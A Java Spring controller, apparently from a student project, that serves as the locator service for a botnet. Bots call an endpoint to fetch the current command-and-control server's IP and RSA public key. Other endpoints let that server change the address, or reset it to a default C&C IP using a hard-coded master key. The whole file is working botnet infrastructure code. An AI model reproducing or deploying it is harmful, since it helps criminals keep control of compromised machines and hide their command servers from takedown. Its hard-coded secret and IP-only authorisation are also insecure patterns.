package cs.sii.dns.controller;

import java.io.IOException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.PublicKey;
import java.security.Security;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import cs.sii.dns.domain.IP;
import cs.sii.dns.domain.Pairs;

@Controller
public class DNSController {

	public PublicKey pubKey;
	private String resetMasterKey = "1TpUXuLLNrC9p7q7QLtJxjurK8ALQ4VJJXh10qsUh9qrO57G5Gmy9xGHYO7lO2fbw3YKmA2ii8J0Tkk6QqVDOHjmyNFbGV2MmZW9ji3lxmH53EOhGAwHeXmWcJCr36Z0KbO67EWtT6QX2W28jx9bgZ2AXkWzfbAT4rnlptmaT5f2DN28FT1KKmAEicW035nWZRy9enilNuihoUKczn3Sme548EKmDoGWCl0BXJKMpeAlrZ802oD7ZqiNs9IJLw8VC0qs2F6aOXB1GB4foGCW33PMHpkyXuh0BRxWtnqBgiJC5rivNJEIfISOOcMWRI8sQUTDSaIHjIWGUE0YeNxMVItYMo6rmaUvEI8v0UHaorSHT80vaIgr0YngWNjlNBcAMF2QZTDkRxLaF1lcbnT7VYjzaBCy7niyYgSKkWNicPZb59ITqsoqeLAG1qtTDWRBt9lylfNMrwwnLy0TZIPIt3hYNJUZV9SoJCJ1LzEoe4kH6VHk4v1VnJGOooyBFfFmx109TycUqS0hTzDm7TX3EVkQb6bq7mtApBHWkCam2BI6Lf056QrRDyV6tfMl5SXVlMJpX5sKJVB2DGnssujT6F0iGrgsf6LQYXnM5yy24arzaqSzAtiFHb6bW6V6RaIzZ0jcuIzKH77jE7XUUUxlpg5vPmSDCXJ5T8R5o8Dj3gvilHAiHsvttnwF87kjiftfWvjnrAk9qPhVYZuSJtFxWODTXhxUuTzHfx6tn87biAEbo0G89o0h4qj2XI0gvevgOf6Q5s1xqX7Rfv3kC9ODHzWFmgZBv2i93tPsm9O3vsfawiFVaSbiM8eKs1WUzU92bHt5tllUSxr0EpZHRGaeYvy6zv3oSYjS6aCxSo9f7qtsFjcsr8oDRs3aSnxLLVZFT1qKT0I9ppwWR4jOoTSQH3EF2ORVDziDxRi91W7pGjPjeBR63AGIMczFB0Jp6Z0DmQkZZmPuCrGjALiL0pZcjnMbQB2g29QI1HZPyGf4ujar3JA7Ds5ru0xByLxPzUb0";
	
	private IP defaultCCIp = new IP("25.52.149.123");
	private PublicKey defaultCCPubKey;
	private Boolean flag = true;
	
	@Autowired
	public IP ipCec;

	@RequestMapping(value = "/ciaosonounbot", method = RequestMethod.POST)
	public @ResponseBody Pairs<String, String> connectBot(HttpServletRequest req, HttpServletResponse error) throws IOException {
		Pairs<String, String> answ = new Pairs<String, String>();
		System.out.println(pubKey);
		if(pubKey!=null){
			answ.setValue1(ipCec.toString());
			String key = Base64.encodeBase64String(pubKey.getEncoded());
			answ.setValue2(key);
		} else {
//			error.setHeader("Location", "/error");
			answ.setValue1("");
			answ.setValue2("");
		}
		System.out.println(answ.toString());
		return answ;
	}

//	@RequestMapping(value = "/ciccio")
//	public @ResponseBody HashMap<String, String> ciccio(){
//		HashMap<String, String> prova = new HashMap<String, String>();
//	}
	
	@RequestMapping(value = "/ciaosonounumano")
	public ModelAndView connectHuman() {
		return new ModelAndView("redirect:" + "http://www.cs.uniroma2.it/");
	}

	@RequestMapping(value = "/alter", method = RequestMethod.POST)
	@ResponseBody
	public Boolean alter(@RequestBody Pairs<IP, String> cec, HttpServletRequest req) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException {
		System.out.println(req.getRemoteAddr());
		System.out.println(ipCec.getIp());
		if (req.getRemoteAddr().equals(ipCec.getIp())) {
			Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
			KeyFactory fact = KeyFactory.getInstance("RSA", "BC");
			byte[] encoded = Base64.decodeBase64(cec.getValue2());
			pubKey = fact.generatePublic(new X509EncodedKeySpec(encoded));
			ipCec.setIp(cec.getValue1().toString());
			System.out.println("C&C updated correctly.");
			if (flag) {
				System.out.println("First access: setting default values.");
				defaultCCIp = ipCec;
				defaultCCPubKey = pubKey;
				flag = false;
			}
			return true;
		} else {
			System.out.println("ALTER failed.");
			return false;
		}
	}
	
	@RequestMapping(value = "/reset", method = RequestMethod.POST)
	@ResponseBody
	public Boolean reset(@RequestBody String resetKey, HttpServletRequest req){
		System.out.println(resetKey);
		if(resetKey.equals(resetMasterKey)){
			ipCec = defaultCCIp;
			pubKey = defaultCCPubKey;
			System.out.println("C&C resettato da " + req.getRemoteAddr() + ":" + req.getRemotePort());
			return true;
		} else {
			System.out.println("RESET failed.");
			return false;
		}
	}
	
	

}
